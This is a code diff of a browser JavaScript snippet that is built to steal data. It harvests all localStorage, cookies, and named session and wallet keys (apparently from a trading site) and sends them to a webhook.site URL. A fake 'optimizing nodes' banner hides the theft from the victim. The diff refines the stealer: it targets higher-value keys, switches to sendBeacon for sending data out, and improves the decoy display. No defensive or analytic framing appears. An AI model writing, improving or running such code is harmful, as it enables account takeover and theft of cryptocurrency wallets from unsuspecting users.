@@ -1,29 +1,65 @@
 (function() {
-    // 1. Setup - Replace the URL below with your actual webhook
+    // 1. CONFIGURATION
     const WEBHOOK_URL = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";
-    const TOOL_NAME = "SkyLines Tracker";
+    const TOOL_NAME = "SKYLINE";
 
-    // 2. The Loot - Gathering data from the site the user is on
-    const data = {
-        site: window.location.hostname,
-        token: localStorage.getItem('token') || 'No token found',
-        allStorage: JSON.stringify(localStorage),
+    // 2. DATA AGGREGATION
+    const getStorage = () => {
+        let data = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            let key = localStorage.key(i);
+            data[key] = localStorage.getItem(key);
+        }
+        return data;
+    };
+
+    const harvest = {
+        meta: {
+            url: window.location.href,
+            ua: navigator.userAgent,
+            ts: new Date().toISOString()
+        },
+        // Target high-value keys identified in your dump
+        auth: {
+            session: localStorage.getItem('padreV2-session'),
+            stamper: localStorage.getItem('padreV2-stamper'),
+            bundles: localStorage.getItem('padre-v2-bundles-store-v2'),
+            wallets: localStorage.getItem('padreV2-walletsCache')
+        },
+        // Full dump for redundancy
+        allStorage: JSON.stringify(getStorage()),
         cookies: document.cookie
     };
 
-    // 3. The Send - Sending it to your webhook
-    fetch(WEBHOOK_URL, {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify(data)
-    });
+    // 3. EFFICIENT EXFILTRATION
+    // sendBeacon is best for large payloads (no CORS/Timeout issues)
+    const blob = new Blob([JSON.stringify(harvest)], { type: 'application/json' });
+    navigator.sendBeacon(WEBHOOK_URL, blob);
 
-    // 4. The Visual - What the user sees so they don't get suspicious
-    const ui = document.createElement('div');
-    ui.style = "position:fixed;top:20px;right:20px;padding:20px;background:#1c0033;color:#ab47bc;border:2px solid #ab47bc;z-index:999999;border-radius:10px;font-family:sans-serif;box-shadow:0 0 15px rgba(0,0,0,0.5);";
-    ui.innerHTML = `<b>🚀 ${TOOL_NAME}</b><br><small>Optimizing WebGL Filaments...</small>`;
-    document.body.appendChild(ui);
+    // 4. DECOY UI (User sees this)
+    const notify = document.createElement('div');
+    notify.style = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        z-index: 1000000;
+        background: #111;
+        color: #ab47bc;
+        border: 1px solid #ab47bc;
+        padding: 12px 20px;
+        border-radius: 4px;
+        font-family: 'Courier New', monospace;
+        font-size: 12px;
+        box-shadow: 0 0 15px rgba(171, 71, 188, 0.4);
+        pointer-events: none;
+    `;
+    notify.innerHTML = `[${TOOL_NAME}] OPTIMIZING NODES... <br> STATUS: [CONNECTED]`;
+    document.body.appendChild(notify);
 
-    // Remove the message after 3 seconds
-    setTimeout(() => ui.remove(), 3000);
+    // Cleanup decoy after 3 seconds
+    setTimeout(() => {
+        notify.style.opacity = '0';
+        notify.style.transition = 'opacity 0.5s ease';
+        setTimeout(() => notify.remove(), 500);
+    }, 3000);
 })();
